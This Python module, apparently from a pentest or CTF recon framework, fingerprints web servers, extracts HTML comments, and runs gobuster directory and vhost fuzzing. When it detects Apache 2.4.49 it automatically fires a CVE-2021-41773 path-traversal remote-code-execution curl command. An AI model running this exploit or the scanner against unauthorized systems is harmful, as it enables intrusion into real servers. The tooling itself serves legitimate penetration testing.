import subprocess
from threading import Thread
from mods.mod_utils import *
from mods import mod_dns
from mods.http_wordlist import wordlist
import requests
import urllib3
import re
import os


# Globals
extensions = ['.txt', '.bak', '.cgi']
common_words = []
fast_wordlist = ''
ip = ''
port = ''
fuzz_list = []
fuzz_done = []
tested_wordlist = []
comments_founded = []
dns = ''
proto = 'http'
# Disable insecure request warnings from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def http_connect_to_server(url):
    response = None
    try:
        response = requests.get(url, verify=False)
        http_extract_comments(response)

        if (response.status_code == 400) and ('HTTPS' in response.text):
            current_protocol = proto
            http_change_protocol()
            response = requests.get(url.replace(current_protocol, proto), verify=False)
    except Exception as e:        
        e = str(e)

        if ('Name or service not known' in e):
            http_identify_dns(e)

    return response


def http_change_protocol():
    global proto
    if (proto == 'http'):
        proto = 'https'
        return
    proto = 'http'


def http_identify_dns(e):
    global dns
    # Handle redirections to an unregistered domain or subdomain
    if (len(dns) > 1):
        return

    _dns = re.findall("host='(.*)',", e)
    uri = re.findall('with url: (.*) \(', e)    

    # Update DNS
    if _dns:
        subdomains = [_dns[0]]
        len_dns = _dns[0].split('.')
        main_domain = _dns[0]
        if len(len_dns) > 2:
            main_domain = f'{len_dns[-2]}.{len_dns[-1]}'
            subdomains.append(main_domain)
        if len(dns) < 1:
            dns = main_domain

            register_subdomains(subdomains)


def create_short_wordlist():
    global fast_wordlist
    fast_wordlist_filename = f'{os.path.dirname(os.path.abspath(__file__))}/wordlist.txt'
    if not os.path.exists(fast_wordlist_filename):
        with open(fast_wordlist_filename, 'w') as file:
            file.write('\n'.join(wordlist))
            file.close()
    fast_wordlist = fast_wordlist_filename


def launch_threads(threads):
    # Helper function to start and join threads
    for thread in threads:
        try:
            thread.start()
        except:
            pass
    for thread in threads:
        try:
            thread.join()
        except:
            pass
    return []


def http_identify_server(response):
    global extensions
    if not response:
        return

    server_header = response.headers['Server']
    if 'Apache' in server_header:
        print_banner(port)
        printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
        printc(f'[!] {server_header}', BLUE)
        extensions.append('.php')

        if '2.4.49' in server_header:
            cmd = f"curl http://{response.request.headers['Host']}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

                if output:
                    if 'uid' in output:
                        print_banner(port)
                        printc('[+] Possible RCE confirmed. CVE-2021-41773', RED, YELLOW)
                        printc(cmd, BLUE)
                        print(output)
            except:
                return
    elif 'Microsoft-IIS' in server_header:
        print_banner(port)
        printc('[!] Microsoft IIS server, Fuzzing for ASP, ASPX files.', GREEN)
        printc(f'[!] {server_header}', BLUE)
        extensions.append('.asp')
        extensions.append('.aspx')


def http_extract_comments(response):
    body = str(response.text)
    results_html = re.findall('(<!--.*-->)', body)
    results_version = re.findall('.*(".{1,40}\d{1,1}\.\d{1,2}\.\d{0,2}.{1,40}").*\n', body)
    comments = results_html + results_version

    if comments:
        to_show = []
        for comment in comments:
            if comment in comments_founded:
                continue
            comments_founded.append(comment.strip())
            to_show.append(comment)
        if not to_show:
            return
        comments_data = '\n\n'.join(to_show)
        print_banner(port)
        print(f'[!] Comments found in: {response.request.url}')
        printc(comments_data, GREEN)


def call_gobuster(filename, url):
    global fuzz_done
    if (url in fuzz_done):
        return None # Return None if URL has already been tested*

    cmd = f'gobuster dir -u {url} -q -w {filename} -x {",".join(extensions)} -t 70 -z --no-error -k'   
    fuzz_done.append(url)
    response = http_connect_to_server(url) 
    output = None

    if response:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        except:
            return
    
    return output


def http_fuzz_files(url):
    global fuzz_done
    filename = fast_wordlist 

    output = call_gobuster(filename, url)

    if output:
        print_banner(port)
        print(f'[!] gobuster dir -u {url} -q -w {filename} -x {",".join(extensions)} -t 70 -z --no-error -k')
        printc(f'[!] URL: {url}', GREEN)
        print(output.replace('\n\n', '\n'))
        
        # Handle Redirections
        redirections = re.findall('--> (.+)\]', output)
        if redirections:
            for new_url in redirections:   
                if '://' in new_url: 
                    if (not ip in new_url) and (len(dns) < 1):
                        if '/' in new_url:
                            register_subdomains([new_url.split('/')[2]])    
                elif (new_url[0] == '/'):
                    host = url.split('/')[2]
                    new_url = f'{proto}://{host}{new_url}'
                else:
                    host = url.split('//')[1]
                    new_url = f'{proto}://{host}/{new_url}'
                fuzz_list.append(new_url)

        # Extract comments
        uris = []
        if url[-1] == '/':
            url = url[:-1]
        for line in output.splitlines():
            if 'Status: 2' in line:
                uri = '/' + line.split('(')[0].strip().split('/')[1]
                new_url = url + uri
                if new_url in fuzz_done:
                    return
                fuzz_done.append(url)
                http_connect_to_server(new_url)
            if 'Status: 403' in line: 
                uri = '/' + line.split('(')[0].strip().split('/')[1] + '/'
                new_url = url + uri
                if new_url in fuzz_done:
                    return
                fuzz_list.append(new_url)


def register_subdomains(subdomains, cmd=None):
    global fuzz_list
    if len(subdomains) > 0:    
        mod_dns.dns_add_subdomains(ip, subdomains)

        for subdomain in subdomains:
            new_url = f'http://{subdomain}'
            fuzz_list.append(new_url)
        
        print_banner(port)
        if cmd:
            print(f'[!] {cmd}')
        printc('[+] Some subdomains have been found:', GREEN)
        for subdomain in subdomains:
            printc(f'[+] {subdomain}', BLUE)
    return new_url


def http_fuzz_subdomains():
    filename = fast_wordlist

    cmd = f'gobuster vhost -u {dns} -q -w {filename} -t 70 -z --no-error --append-domain -k'
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except:
        return
    if output:
        results = output.splitlines()
        subdomains = []
        for line in results:
            if dns in line:
                subdomain = line.split(' ')[1]
                subdomains.append(subdomain)   
        register_subdomains(subdomains, cmd)


def handle_http(_ip, _port):
    global ip
    global port
    global fuzz_list
    global dns

    ip = _ip
    port = _port
    
    current_proto = proto
    base_url = f'{proto}://{ip}:{port}'
    fuzz_list.append(base_url)
    create_short_wordlist()

    # Test first connection to the server
    response = http_connect_to_server(base_url)
    if current_proto != proto:
        base_url = base_url.replace(current_proto, proto)
        fuzz_list.append(base_url)
    http_identify_server(response)
    dns_tested = False

    while len(fuzz_list) > 0:
        threads = []

        for url in fuzz_list:
            if not dns_tested and (not ip in url) and (len(dns) < 1):
                _dns = url.split('/')[2]
                dns = _dns
                len_dns = _dns.split('.')
                if len(len_dns) > 2:
                    dns = f'{len_dns[-2]}.{len_dns[-1]}'

            # Start threads to execute
            thread = Thread(target=http_fuzz_files, args=(url, ))
            threads.append(thread)
        
        if not dns_tested and (len(dns) > 1):
            dns_tested = True
            thread = Thread(target=http_fuzz_subdomains, args=())
            threads.append(thread)

        threads = launch_threads(threads)
        
        for url in fuzz_done:
            if url in fuzz_list:
                fuzz_list.remove(url)           